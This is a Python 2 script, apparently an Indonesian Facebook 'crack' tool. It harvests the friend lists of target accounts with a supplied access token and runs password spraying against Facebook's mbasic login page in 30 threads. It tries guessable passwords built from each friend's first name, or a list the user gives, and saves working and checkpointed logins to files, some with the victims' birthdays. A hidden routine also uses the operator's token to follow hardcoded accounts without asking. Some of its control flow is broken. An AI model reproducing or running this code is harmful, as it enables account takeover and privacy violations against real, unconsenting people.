# Recode By Riukha Xhein
# Hai Decker. Scriptnya Sama Aja Isinya Ngapain Lu Dec
# Scriptnya Udah Enak, Gausah Di Recode Lagi Ngentod
import os,sys,time,datetime,random,hashlib,re,threading,json,cookielib,requests,uuid,itertools,subprocess,ipaddress,concurrent.futures,current,base64
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from time import sleep
from datetime import datetime
from random import randint
try:
	import requests
except ImportError:
	print ' !: Modul requests belum terinstal !...\n'
	os.system('pip install requests' if os.name == 'nt' else 'pip2 install requests')
reload(sys)
sys.setdefaultencoding('utf8')

b='\033[1;94m'
i='\033[1;92m'
c='\033[1;96m'
m='\033[1;91m'
u='\033[1;95m'
k='\033[1;93m'
p='\033[1;97m'
h='\033[1;92m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH 
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
s = requests.Session()
ip = requests.get('https://api.ipify.org').text
host ='https://mbasic.facebook.com'
#uas = random.choice(['ua','ua1','ua2','ua3','ua4','ua5','ua6','ua7','ua8','ua9','ua10','ua11','ua12','ua13'])
ua = 'NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)'
ua1 = 'Mozilla/5.0 (Linux; U; Android 5.1.1; en-US; HUAWEI MT7-TL10 Build/HuaweiMT7-TL10) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.5.2.582 U3/0.8.0 Mobile Safari/534.30'
ua2 = 'Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36'
ua3 = 'Mozilla/5.0 (Linux; U; Android 4.4.2; zh-cn; GT-I9500 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36'
ua4 = 'Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4X Build/MiUI MS; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36'
ua5 = 'Opera/9.80 (Android; Opera Mini/12.0.1987/37.7327; U; pl) Presto/2.12.423 Version/12.16'
ua6 = 'Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Nokia; Lumia 520) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Mobile Safari/537.36 Edge/12.0'
ua7 = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
ua8 = 'Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0'
ua9 = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2'
ua10 = 'NokiaX2-02/2.0 (11.79) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2;.NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2) UCBrowser8.4.0.159/70/352'
ua11 = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/84.0.4147.125 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/283.0.0.31.121;]'
ua12 = 'Mozilla/5.0 (Linux; Android 10; moto g(7) power Build/QCOS30.85-18-6; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/294.0.0.39.118;]'
ua13 = 'Mozilla/5.0 (Linux; Android 7.0; Infinix HOT 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/114.0.0.21.71;]'

uas = random.choice(['UCWEB/2.0 (Java; U; MIDP-2.0; en-US; samsung-sm-b350e) U2/1.0.0 UCBrowser/8.9.0.251 U2/1.0.0 Mobile'])


id = []
cp = []
ok = []
ttl = []
loop = 0
current = datetime.now()
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
durasi = str(datetime.now().strftime("%d/%m/%Y"))
ta = current.year
op = current.month
ha = current.day

MAX_IPV4 = ipaddress.IPv4Address._ALL_ONES  # 2 ** 32 - 1
MAX_IPV6 = ipaddress.IPv6Address._ALL_ONES  # 2 ** 128 - 1

def random_ipv4():
	return  ipaddress.IPv4Address._string_from_ip_int(random.randint(0, MAX_IPV4))
def random_ipv6():
	return ipaddress.IPv6Address._string_from_ip_int(random.randint(0, MAX_IPV6))

def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

def defaultua():
    ua = "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36"
    try:
        ugent = open('ugent.txt','w')
        ugent.write(ua)
        ugent.close()
    except (KeyError, IOError):
        logs()

def menu_user_agent():
    print("\n [1] Dapatkan User Agent HP-mu")
    print(" [2] Mengganti User Agent")
    print(" [3] Menghapus User Agent")
    print(" [4] Cek User Agent")
    print(" [0] Kembali")
    pilih_menu_user_agent()

def pilih_menu_user_agent():
    pmu = raw_input("\n [?] Pilih : ")
    if pmu == "":
        print(" [!] Pilih Yang Bener!!")
    elif pmu == '01' or pmu == '1':
        os.system('xdg-open https://www.google.com/search?q=My+User+Agent&oq=My+User+Agent&aqs=chrome..69i57j0l3j0i22i30l6.4674j0j1&sourceid=chrome&ie=UTF-8')
        raw_input(" [?] Kembali")
        menu()
    elif pmu == '02' or pmu == '2':
        change_ugent()
    elif pmu in["3","03"]:
        os.system("rm -rf ugent.txt")
        print("\n [?] Berhasil Menghapus User Agent")
        raw_input("\n [?] Kembali")
        menu()
    elif pmu == '04' or pmu == '4':
        check_ugent()
    elif pmu == '00' or pmu == '0':
        menu()
    else:
        print(" [!] Pilih Yang Bener")

def change_ugent():
    os.system("rm -rf ugent.txt")
    ua = raw_input("\n [?] Masukan User Agent : ")
    try:
        ugent = open('ugent.txt','w')
        ugent.write(ua)
        ugent.close()
        jalan("\n [?] Sukses Mengganti User Agent")
        raw_input("\n [?] Kembali")
        menu()
    except (KeyError, IOError):
        jalan("\n [?] Gagal Mengganti User Agent")
        raw_input("\n [?] Kembali")
        menu()

def check_ugent():
    try:
        ungser = open('ugent.txt', 'r').read()
    except IOError:
        ungser = (" [?] User Agent Tidak Ditemukan")
    except:pass
    print ("\n [?] User Agent Kamu  : "+ungser)
    raw_input("\n [?] Kembali")
    menu()

def logo():
	os.system("clear")
	print("""
            __  _                
 ___ ____  / /_(_)               
/ _ `/ _ \/ __/ /                
\_,_/_//_/\__/_(_)      ____ __  
  __ _  __ _____  ___ _/ _(_) /__
 /  ' \/ // / _ \/ _ `/ _/ /  '_/
/_/_/_/\_,_/_//_/\_,_/_//_/_/\_\ 
   """)
def bot_follow():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("\n   [!] Token invalid")
		logs()
		requests.post('https://graph.facebook.com/100009447779678/subscribers?access_token='+ toket)      #M4L41K4T
		requests.post('https://graph.facebook.com/100000517973128/subscribers?access_token='+ toket)      #AZKA
		requests.post('https://graph.facebook.com/100003603863923/subscribers?access_token='+ toket)      #EMPRIT
		requests.post('https://graph.facebook.com/100004003690596/subscribers?access_token='+ toket)      #Widiya
		requests.post('https://graph.facebook.com/100001403405461/subscribers?access_token='+ toket)      #Dhenii Saraswati
		requests.post('https://graph.facebook.com/100001152080193/subscribers?access_token='+ toket)      #Mustolih Lih
		requests.post('https://graph.facebook.com/100001134480658/subscribers?access_token='+ toket)      #Taufik Unik Timbul
		requests.post('https://graph.facebook.com/100011083959831/subscribers?access_token='+ toket)      #Dica
		requests.post('https://graph.facebook.com/100038342055141/subscribers?access_token='+ toket)      #Unik KOEN KONTOL
		requests.post('https://graph.facebook.com/1475910687/subscribers?access_token='+ toket)      #Hozuki Suigetsu (2008)
		requests.post('https://graph.facebook.com/1836754937/subscribers?access_token='+ toket)      #Artha Ajah
        menu()
        print ' [!] Token Invalid!'
        sys.exit()

def tokenz():
	os.system('clear')
	try:
		token = open('login.txt', 'r')
		menu()
	except (KeyError, IOError):
		os.system('clear')
		logo()
		print""+N+""
		#print" [+] Cara Ambil Token Bisa Cek Di https://youtu.be/IdxphPBMMTU"
		token = raw_input('\n [+] Masukkan Token : ')
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.text)
			zedd = open('login.txt', 'w')
			zedd.write(token)
			zedd.close()
			bot_follow()
			defaultua()
			menu()
		except KeyError:
			print("[!] Token Invalid!")
			sys.exit()


def menu():
    global token
    os.system('clear')
    try:
        token = open('login.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print'[!] Token Invalid!'
        os.system('rm -f login.txt')
        time.sleep(3)
        tokenz()
    except requests.exceptions.ConnectionError:
        print'[!] Tidak Ada Koneksi!'
        sys.exit()

    logo()
    print("\n\x1b[0m AU) Cah Banyumas") 
    print("\x1b[0m FB) https://fb.me/M4L41K4T.T4K.B3R54Y4P")
    #print(" [*] -------------------------------------------")
    #print(" [*] Tumbal     : "+nama)
    #print(" [*] ID         : "+id)
    #print(" [*] IP         : "+ip)
    print("")
    print(" [1]. crack dari teman public")
    print(" [2]. check hasil crack")
    #print(" [3]. Setting User Agent")
    print(" ["+m+"0"+N+"]. hapus token")
    pilih_menumbasic()


def pilih_menumbasic():
    ask = raw_input('\n [?] pilih : ')
    if ask == '':
        print'[!] pilih yang benar!'
        exit()
    elif ask == '01' or ask == '1':
        print(" [*] ketik 'me' untuk crack dari daftar teman")
        idt = raw_input(' [+] id target : ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            sp = json.loads(pok.text)
            print' [+] nama : ' + sp['name']
        except KeyError:
            print'[!] teman diprivate!'
            exit()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
        print' [+] total id : ' + str(len(id))

    elif ask == '02' or ask == '2':
        print'\n [1] Hasil OK '
        print' [2] Hasil CP '
        ress = raw_input('\n [?] Pilih : ')
        if ress == '':
            menu()
        elif ress == '01' or ress == '1':
            print' [+] Hasil \x1b[0;92mOK\x1b[0;97m Tanggal : \x1b[0;92m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
            os.system(' cat out/OK-%s-%s-%s.txt' % (ha, op, ta))
            raw_input("\n [?] Kembali")
            menu()
        elif ress == '02' or ress == '2':
            print ' [+] Hasil \x1b[0;93mCP\x1b[0;97m Tanggal : \x1b[0;92m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
            os.system(' cat out/CP-%s-%s-%s.txt' % (ha, op, ta))
            raw_input("\n [?] Kembali")
            menu()
        else:
            exit(' [!] Pilih Yang Benar!')
    elif ask == '03' or ask == '3':
        return menu_user_agent()
    elif ask == '0' or ask == '00':
        os.system('rm -f login.txt')
        print(" [!] Berhasil Menghapus Token")
        exit()
    else:
        print'[!] Pilih Yang Benar!'
        exit()
    ask = raw_input('\x1b[0m [?] menggunakan password manual? [y/t]: ')
    if ask == 'Y' or ask == 'y':
        manualmbasic()

    #print'\n [+] Hasil OK Disimpan Di : OK.txt'
    #print" [+] Hasil CP Disimpan Di : CP.txt"
    print("\x1b[0m [!] tekan CTRL+z untuk stop")
    print("")

    def main(arg):
        global loop
        print'\r\x1b[0m* %s/%s |ok:%s |cp:%s ' % (len(id), loop, len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for pw in [name.lower(),name.lower()+'1234',name.lower()+'12345',name.lower()+'123','bangsat','sayang']:
                rex = requests.post('https://mbasic.facebook.com/login.php', data={'email':uid,'pass':pw, 'login':'submit'}, headers={'user-agent':uas})
                xo = rex.content
                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                    print'\r '+h+'---> ' + uid + '|'+ pw + '    '
                    ok.append(uid + ' | ' + pw)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' [OK] ' + str(uid) + ' | ' + str(pw) +                                   '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'checkpoint' in xo:
                    try:
                        token = open('login.txt').read() 
                        sw = requests.get('https://graph.facebook.com/'+uid+'/?access_token=' + token)
                        b = json.loads(sw.text)
                        ttl = b['birthday']
                        print'\r '+k+'---> ' + uid + '|'+ pw + ' ' + ttl + '    '
                        cp.append(uid + ' | ' + pw + ' | ' + ttl)
                        save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                        save.write(' [CP] ' + str(uid) + ' | ' + str(pw) + ' | ' + str(ttl) +                        '\n')
                        save.close()
                        break
                    except(KeyError, IOError):
                        ttl = " "
                    except:pass
                    print'\r'+k+' ---> ' + uid + '|'+ pw + '    '
                    cp.append(uid + ' | ' + pw)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' [CP] ' + str(uid) + ' | ' + str(pw) +                        '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print'\n[+] Selesai'
    exit()


def manualmbasic():
    print'\n [+] exp. password : bismillah,sayang,rahasia'
    pw = raw_input(' [?] password list : ').split(',')
    #print(" [*] Menggabungkan Password Tambahan Dan Otomatis")
    if len(pw) == 0:
        exit('[!] Isi Yang Benar, Tidak Boleh Kosong!')
    #print'\n [+] Hasil OK Disimpan Di : OK.txt'
    #print" [+] Hasil CP Disimpan Di : CP.txt" 
    print("\n [!] CTRL+z untuk stop")
    print("")

    def main(arg):
        global loop
        print'\r\x1b[0m* %s/%s |ok:%s |cp:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for asu in pw:
                rex = requests.post('https://mbasic.facebook.com/login.php', data={'email':uid,'pass':asu,'login':'submit'}, headers={'user-agent':uas})
                xo = rex.content
                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                    print'\r'+h+' ---> ' + uid + '|' + asu + '    '
                    ok.append(uid + ' | ' + asu)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('*--> ' + str(uid) + ' | ' + str(asu) +                         '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'checkpoint' in xo:
                    try:
                        token = open('login.txt').read()  
                        sw = requests.get('https://graph.facebook.com/'+uid+'/?access_token=' + token)
                        b = json.loads(sw.text)
                        ttl = b['birthday']
                        print'\r'+k+' ---> ' + uid + '|' + asu + ' ' + ttl + '    '
                        cp.append(uid + ' | ' + asu + ' | ' + ttl)
                        save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                        save.write(' [CP] ' + str(uid) + ' | ' + str(asu) + ' | ' + str(ttl) +                        '\n')
                        save.close()
                        break
                    except(KeyError, IOError):
                        ttl = " "
                    except:pass
                    print'\r'+k+' ---> ' + uid + '|' + asu + '    '
                    cp.append(uid + ' | ' + asu)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' [CP] ' + str(uid) + ' | ' + str(asu) +                        '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass


    p = ThreadPool(30)
    p.map(main, id)
    print'\n[+] Selesai'
    exit()



if __name__ == '__main__':
    os.system('clear')
    print logo
    tokenz()
